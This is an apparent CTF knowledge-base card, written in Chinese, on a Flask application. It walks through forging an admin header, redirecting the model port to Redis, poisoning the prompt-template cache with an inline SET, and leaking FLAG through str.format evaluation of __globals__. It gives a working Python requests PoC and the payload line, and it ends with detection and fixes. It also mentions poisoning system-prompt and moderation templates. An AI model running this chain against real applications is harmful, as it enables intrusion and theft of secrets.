---
id: web-python-ssti-redis-prompt-cache-poison-format-globals
title: 模型端口劫持 SSRF 打 Redis + prompt 缓存投毒：str.format 求值 __globals__ 读取 FLAG
type: scenario
domain: web
path: web/python/ssti
technique: redis-prompt-cache-poison-str-format-globals
tags:
- python
- ssti
- format-string
- flask
- redis
- cache-poisoning
- ssrf
- raw-socket
- ctf
- awdp
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V167
  verified_at: '2026-11-06T09:52:48+08:00'
  notes: 已对照原文源码与2张图核对：get_template Redis 缓存、get_prompt .format(t=self)、generate_prompt 固定 math-v1 均一致；端口劫持到 6379 后用 raw_ask 发 inline SET 污染缓存、再 /ask 触发 {t.__init__.__globals__} 回显链成立。原卡已注明原文 PoC 缺 X-Secret 且补占位。PoC 未在本机复跑。
url: /docs/web/python/ssti/web-python-ssti-redis-prompt-cache-poison-format-globals/
draft: false
kb_aliases:
- Redis 提示词缓存投毒
- prompt 模板缓存污染
- 模型端口劫持 SSRF
- str.format 属性求值
- t.__init__.__globals__
- Flask globals 读 flag
- 无回显 SSTI 带外
---

## 一句话结论

Flask 应用把提示词模板缓存进 Redis，同时提供“改模型端口”的后台接口和“自定义 prompt 直发模型”的调试接口；攻击者用可伪造的角色请求头进入后台，把模型端口改成 6379，经原始 socket 向 Redis 写入 `SET prompt:math-v1 {t.__init__.__globals__}` 污染模板缓存，再请求 `/ask` 触发 `str.format(t=self)` 求值，模块全局字典（含 `from flag import FLAG`）随响应的 `prompt` 字段回显。

## 原理

- **入口一：端口可配置的原始 socket SSRF**。`query_model()` 用 `socket.connect(("127.0.0.1", get_model_port(model_id)))` 连接“模型服务”，并 `sendall(prompt.encode())` 把 prompt 原样发过去。`model_ports` 是模块级字典，后台接口 `/admin/model_ports` 可把任意 `model_id` 的端口改掉；把 `default` 改成 `6379` 后，模型调用就被劫持到本机 Redis，prompt 字符串直接成为 Redis 的命令字节。这与 gopher/dict 打 Redis 等价，只是发送端是应用自己的原始 socket，不经过 URL 解析器。
- **Redis inline 协议让 SET 成立**。Redis 对首字节不是 `*` 的输入按 inline 命令处理：按空白切分整行并执行。因此 `SET prompt:math-v1 {t.__init__.__globals__}\n` 会被拆成 `SET`、`prompt:math-v1`、`{t.__init__.__globals__}` 三个参数并成功写入；payload 需要带换行来结束这一行（原文 payload 的三引号字符串自带尾部 `\n`）。
- **入口二：模板缓存来源被污染**。`PromptTemplate.get_template(template_id)` 先查 `redis_conn.get(f"prompt:{template_id}")`，只有不存在时才从 `static/prompts/<template_id>.txt` 读文件并回填 Redis。由于上一步我们能直接向同一个 Redis 写键，`prompt:math-v1` 的“缓存”内容就变成攻击者指定的模板，而不是磁盘上的可信文件。
- **sink：原生 str.format 解析属性表达式**。`get_prompt()` 执行 `get_template(template_id).format(t=self)`。Python 的格式化字段会按属性/下标语法求值，`t.__init__` 是绑定方法，method 对象在自身找不到属性时会把查找转发给底层函数对象，因此 `t.__init__.__globals__` 返回 `PromptTemplate.__init__` 所在模块的全局命名空间。该模块顶部有 `from flag import FLAG`，FLAG 就在这个字典里；`format()` 对字典调用 `str()`，整个 dict repr 被拼进 `final_prompt`。
- **回显点**。模板渲染结果不是写进某个 HTML 模板，而是成为 `final_prompt`；`/ask` 的响应 JSON 里包含 `{"answer": response, "prompt": final_prompt, ...}`，所以即使模板注入本身“没有直接回显”，FLAG 也会出现在 `prompt` 字段。原文标题所说的“无回显”指模板参数 `prompt_id` 被硬编码为 `math-v1`、攻击者不能直接控制模板内容，需要先用 Redis 把缓存写脏。
- **前置的权限校验缺陷**。`/admin/model_ports` 与 `/admin/raw_ask` 的校验是 `session["user"]` 存在 + `X-User-Role == "admin"` + `X-Secret == 硬编码值`。角色直接取自客户端请求头，密钥硬编码在源码中；赛事/源码泄露场景下，任意注册用户加两个请求头即可调用后台接口。`whoami()` 同样信任 `X-User-Role`，只影响展示，不是根因。

## 触发条件

- 应用使用 Redis 缓存 prompt/模板，且缓存键前缀与模板 ID 可预测（如 `prompt:<template_id>`）。
- 存在可修改后端服务主机/端口的接口，且改动对攻击者可达（后台鉴权可绕过，或接口本身缺权限）。
- 应用能用原始 socket/HTTP 客户端把可控字符串原样发往该端口；目标 Redis 可被应用本机访问（通常 6379，且未启用 ACL/requirepass，或已获得口令）。
- 模板渲染使用 `str.format`、`format_map` 或其他会解析属性表达式的格式化方式，且模板文本来自缓存/数据库等可写存储。
- 应用模块级导入了敏感对象（FLAG、密钥、配置），且该模块正是模板对象的 `__init__` 所在模块，`__globals__` 可达。
- 攻击者能注册并登录（本应用注册无限制）。

## 利用步骤

1. `POST /register` 注册任意账号，`POST /login` 登录并保存会话 Cookie。
2. 带会话 Cookie，添加 `X-User-Role: admin` 和源码中的 `X-Secret`，`POST /admin/model_ports`，body `{"model_id":"default","port":6379}`，把默认模型端口改成 Redis。
3. `POST /admin/raw_ask`，body `{"prompt":"SET prompt:math-v1 {t.__init__.__globals__}\n","model_id":"default"}`。`query_model()` 先按 `md5(prompt):model_id` 查缓存（未命中），再连接 `127.0.0.1:6379` 发送该行；Redis 以 inline 协议执行 `SET`，返回 `+OK`。
4. `POST /ask`，body `{"question":"hi"}`。`generate_prompt()` 固定用 `template_id="math-v1"`，`get_template()` 命中被污染的 `prompt:math-v1`，`format(t=self)` 求值 `t.__init__.__globals__`，响应 `prompt` 字段返回模块全局字典。
5. 从响应 `prompt` 中读取 `FLAG`（也可见 `answer` 字段里 Redis 对后续命令的报错，可辅助确认端口劫持生效）。

## PoC

```python
import json
import requests

BASE = "http://TARGET:8000"
s = requests.Session()
s.post(f"{BASE}/register", json={"username": "u1", "password": "p1"})
s.post(f"{BASE}/login", json={"username": "u1", "password": "p1"})

admin_headers = {"X-User-Role": "admin", "X-Secret": "<源码中的硬编码值>"}

# 1) 把 default 模型端口劫持到本机 Redis
s.post(f"{BASE}/admin/model_ports",
       headers=admin_headers,
       json={"model_id": "default", "port": 6379})

# 2) 通过原始 socket 向 Redis 写 inline 命令，污染模板缓存
payload = "SET prompt:math-v1 {t.__init__.__globals__}\n"
s.post(f"{BASE}/admin/raw_ask",
       headers=admin_headers,
       json={"prompt": payload, "model_id": "default"})

# 3) 触发模板渲染，FLAG 随 prompt 字段返回
r = s.post(f"{BASE}/ask", json={"question": "hi"})
print(r.json()["prompt"])
```

```text
# 等价的 Redis inline 命令（由 query_model 的 socket 发出）
SET prompt:math-v1 {t.__init__.__globals__}
```

PoC 按原文代码链路整理，未在本机复跑；`X-Secret` 需从目标源码/泄露配置中获取，session Cookie 名称与路径按实际环境调整。

## 变体与关联

- 变体：若模板渲染是 Jinja2 `render_template_string`，缓存投毒后改用 `{{ ... }}` 语法，可直接走到 RCE；本应用只用了原生 `str.format`，所以先落点是读 `__globals__`。
- 变体：若没有改端口的接口，但存在 gopher/dict/CRLF 型 SSRF，可直接对 Redis 发 inline `SET`，见 [[web-generic-ssrf-redis-inline-protocol-crlf]]。
- 变体：模板缓存键可枚举时，可投毒其它 prompt（system prompt、审核模板），实现提示词劫持或绕过审核逻辑。
- 变体：若应用不返回渲染后的 prompt，仍可利用同一端口劫持通道向 Redis 发 `GET`、`KEYS` 等命令，把缓存中的内容读回；是否能直达取决于 `query_model` 是否把 socket 响应返回给客户端。
- 关联：[[web-python-ssti-jinja2-flask-globals-rce]]（Jinja2 经 `__globals__` 到命令执行）、[[web-generic-ssrf-ai-inference-model-param-url-ssrf]]（模型参数被当作地址拉取的同类 SSRF）、[[web-generic-auth-token-renewal-trusted-user-headers-admin-jwt]]（信任客户端身份头的鉴权绕过）。
- 边界：Redis 启用 `requirepass`/ACL 时 inline `SET` 需先 `AUTH`，且需要多行 pipeline；后台接口对端口做白名单或禁止 6379；模板改为只从只读文件加载或加完整性校验；`str.format` 被替换为受限占位符替换时失效。

## 检测与防御

- 检测：Redis 中出现值形如 `{...__globals__...}` 的 `prompt:*` 键；6379 上出现非 RESP 的明文命令（`SET`、`CONFIG` 等）；`/admin/model_ports` 被改为 6379 或其它内部管理端口；`/ask` 响应 `prompt` 字段异常增大或包含 Python 字典/模块信息；同一会话的 `X-User-Role` 与真实用户角色不一致。
- 修复：模型端口/地址只允许预定义白名单（按 `model_id` 映射固定后端，禁止用户提交端口），或直接删除该配置接口；后台鉴权必须使用服务端会话中的角色，不能信任 `X-User-Role` 等客户端头，`X-Secret` 不应硬编码。
- 修复：Redis 启用 ACL/`requirepass`，限制应用账号只能读写业务键、禁用 `CONFIG`/`SLAVEOF` 等危险命令；模板缓存写入需要签名或版本校验，渲染前确认模板来自可信只读源。
- 修复：不要对不可信模板调用 `str.format`/`format_map`；改用 `string.Template` 或显式变量替换，避免字段表达式遍历 `__globals__`、`__class__` 等属性；敏感常量不要放在模板对象可达的模块全局中。
- 加固：注册/登录与后台接口做速率限制与角色审计；对 `model_id`、`port` 做类型与范围校验（端口必须是整数且在业务端口段内）。
